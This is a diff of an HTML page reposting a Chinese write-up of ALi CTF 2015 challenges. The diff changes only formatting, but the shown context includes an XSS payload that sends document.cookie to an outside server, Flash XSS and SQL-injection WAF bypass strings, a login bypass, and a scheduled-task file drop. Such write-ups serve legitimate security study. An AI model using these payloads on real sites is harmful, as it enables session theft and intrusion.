@@ -3,22 +3,22 @@
 			<head>
 			     <title>ALi CTF 2015 write up - EvilMoon</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/5493">http://drops.wooyun.org/papers/5493</a></h1>
 				
       <p>
-        <p>Authors:</p>
+        </p><p>Authors:</p>
 
-<p>EM <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="66050803100f0a0b09090826010b070f0a4805090b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+<p>EM <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="66050803100f0a0b09090826010b070f0a4805090b">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
 
-<p>Ricter <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3d4f545e49584f475558535a7d5a505c5451135e5250">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
+<p>Ricter <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3d4f545e49584f475558535a7d5a505c5451135e5250">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
 
 <p><a href="http://drops.wooyun.org/wp-content/uploads/2015/04/%E9%99%84%E4%BB%B6.tar.gz">附件</a></p>
 
 <h1>0x00 Cake</h1>
 
-<hr />
+<hr>
 
 <p>Cake 是一题 Android 题，具体流程就是一个输入一个字符串然后，初始化一个长度为16的数组，然后将字符串与这个数组 xor 。所以我们只需要再 xor 一下就 ok 了。</p>
 
@@ -39,25 +39,25 @@ print s
 
 <h1>0x01 渗透绕过WAF1</h1>
 
-<hr />
+<hr>
 
 <p>2、绕过云 WAF1 是一题绕过 WAF 题，这个 WAF 写的很死，所以就要用其他办法咯～</p>
 
 <p>通过打开的弹窗提示，需要在<code>.alictf.com</code>的子域下面做，于是 fuzz 子域名：</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034027065.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034027065.png" alt="enter image description here"></p>
 
 <p>得出<code>video.alictf.com</code>，打开发现没有 waf，注入点为<code>id</code>。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034148272.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034148272.png" alt="enter image description here"></p>
 
 <h1>0x02 前端初赛题1</h1>
 
-<hr />
+<hr>
 
 <p>反射型 XSS，通过 ph 牛的<a href="http://www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html">文章</a>，<code>&lt;svg&gt;</code>标签内<code>&lt;script&gt;</code>的内容可以 HTML encode，成功弹窗。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034132337.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034132337.png" alt="enter image description here"></p>
 
 <p>之后 payload 如下：</p>
 
@@ -70,45 +70,45 @@ i.src = "http://ricter.me:9999/?" + document.cookie;
 
 <h1>0x03 密码宝宝</h1>
 
-<hr />
+<hr>
 
 <p>密码宝宝 一题逆向题，用了 upx 加壳。</p>
 
 <p>用010editor打开后，可以看到加了upx壳，用upx –d脱壳</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034111368.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034111368.png" alt="enter image description here"></p>
 
 <p>在ida中查找GetWIndowTextA调用的地方</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034147586.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034147586.png" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034131847.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034131847.png" alt="enter image description here"></p>
 
 <p>Sub_405160这个函数就是进行判断的函数</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034168453.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034168453.png" alt="enter image description here"></p>
 
 <p>可以看到逻辑比较简单，就是将”himemnl”的每一位与0x4c,0x5a,0x4b各异或一次，就可以得到密码“5408031”</p>
 
 <h1>0x04 简单业务逻辑</h1>
 
-<hr />
+<hr>
 
 <p>简单业务逻辑 一题逻辑漏洞题～</p>
 
 <p>注册账号，其中 Username 为<code>Admin</code>。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034152002.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034152002.png" alt="enter image description here"></p>
 
 <p>登录后买 -111 个草泥马：</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034218256.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034218256.png" alt="enter image description here"></p>
 
 <p>得到好多钱，然后买最贵的那个。</p>
 
 <h1>0x05 前端初赛题2</h1>
 
-<hr />
+<hr>
 
 <p>前端初赛题2 简单来说就是给你一个 flash 让你弹弹弹</p>
 
@@ -155,7 +155,7 @@ http://8dd25e24b4f65229.alictf.com/swf.swf?%Xdebug=\%22));eval(String.fromCharCo
 
 <h1>0x06 渗透绕过WAF2</h1>
 
-<hr />
+<hr>
 
 <p>绕过云WAF2 题目显示说不在内网，所以第一步就是先设置一个内网 ip 咯 接下来看 writeup</p>
 
@@ -167,14 +167,14 @@ http://8dd25e24b4f65229.alictf.com/swf.swf?%Xdebug=\%22));eval(String.fromCharCo
 <li>172.16.x.x </li>
 </ul>
 
-<p>发现 10 开头的 IP 可以访问。通过更改 HTTP 请求方法为 PATCH 可以让防护等级为中。<br />
+<p>发现 10 开头的 IP 可以访问。通过更改 HTTP 请求方法为 PATCH 可以让防护等级为中。<br>
 更改关键字，如<code>%20</code>改为<code>%0b</code>等绕过检测，注入得到 flag。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034256445.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034256445.png" alt="enter image description here"></p>
 
 <h1>0x07 谁偷了你的站内短信</h1>
 
-<hr />
+<hr>
 
 <p>谁偷了你的站内短信 一题 binary 题</p>
 
@@ -227,7 +227,7 @@ io.interact()
 
 <h1>0x08 业务逻辑和渗透</h1>
 
-<hr />
+<hr>
 
 <p>先弄个正常的用户，找回密码，发现给了个地址</p>
 
@@ -249,7 +249,7 @@ ServerTime：15-03-29 20:46:03
 
 <h1>0x09 前端初赛题3</h1>
 
-<hr />
+<hr>
 
 <pre><code>#!javascript
 &lt;html&gt;
@@ -394,7 +394,7 @@ ServerTime：15-03-29 20:46:03
 
 <h1>0x10 简单业务逻辑2</h1>
 
-<hr />
+<hr>
 
 <pre><code>#!php
 &lt;!--
@@ -472,33 +472,33 @@ function decrypt($cipher) {
 
 <p>所以最终结果写个 Python 脚本算即可&#95;(:з」∠)&#95;</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034283693.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034283693.png" alt="enter image description here"></p>
 
 <p>登录后 Cookie 中有一个 serailize 的注入，过滤了括号，不过分分钟了..</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034273818.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034273818.png" alt="enter image description here"></p>
 
 <h1>0x11 渗透初赛题</h1>
 
-<hr />
+<hr>
 
 <p>就是给一个网站你渗透～</p>
 
 <p>通过 URL 猜测注册的 URL 为更改<code>action</code>为<code>register</code>，之后前端修改绕过限制注册账号。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034329029.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034329029.png" alt="enter image description here"></p>
 
 <p>修改头像处存在列目录漏洞，发现网站备份文件。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034386052.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034386052.png" alt="enter image description here"></p>
 
 <p>进入后台地址，通过万能密码绕过。其中第一层无名之盾绕过方式为 mul 表单绕过，第二层直接<code>or{x 1}#</code></p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034370873.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034370873.png" alt="enter image description here"></p>
 
 <p>代码审计得到 user_bak 函数处存在一个二次注入漏洞（about 那里）。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150403/2015040307034487876.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/drops/20150403/2015040307034487876.png" alt="enter image description here"></p>
 
 <p>得到超级管理员密码，为 h4xxxx!@#。</p>
 
@@ -508,7 +508,7 @@ function decrypt($cipher) {
 
 <h1>0x12 题目名称：宙斯盾</h1>
 
-<hr />
+<hr>
 
 <p>题目描述：你的当前token为 27638e649e4371f54eddb9a201f1b78c</p>
 
@@ -557,7 +557,7 @@ E. 请不要对参赛服务器发起攻击，我们会记录，轻则屏蔽参�
 <pre><code>copy At1.job \\172.16.0.1\\Tasks\
 </code></pre>
 
-<p>复制进去，以防万一我弄了 At2.job 和 At65535.job 然后等待服务器执行！</p>      </p>
+<p>复制进去，以防万一我弄了 At2.job 和 At65535.job 然后等待服务器执行！</p>      <p></p>
     
 			</body>
 		</html>
